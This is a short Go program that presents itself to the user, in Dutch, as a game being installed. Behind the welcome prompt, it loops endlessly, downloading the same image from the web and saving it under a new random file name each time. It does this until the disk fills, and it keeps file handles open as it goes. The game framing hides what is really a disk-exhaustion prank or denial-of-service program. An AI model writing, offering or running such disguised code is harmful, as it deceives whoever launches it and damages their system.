package main

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strconv"
)

func main(){
    fmt.Println("Hallo welkom bij het spel")
    fmt.Println("Wat is jouw naam")
    var naam string
    fmt.Scanln(&naam)
    fmt.Println("Welkom "+naam+" even geduld a.u.b. terwijl we aan het installeren zijn")
    create_image()
}


func create_image(){
    for true{
        url:= "http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"
        response, err := http.Get(url)
        if err!=nil{
            panic(err)
        }
        defer response.Body.Close()
        naam:= rand.Int()
        file,err := os.Create(strconv.Itoa(naam)+".jpg")
        if err!=nil{
            panic(err)
        }
        defer file.Close()
        _,err = io.Copy(file,response.Body)
        if err != nil{
            panic(err)
        }
        fmt.Println("Loadingg....")
    }   
}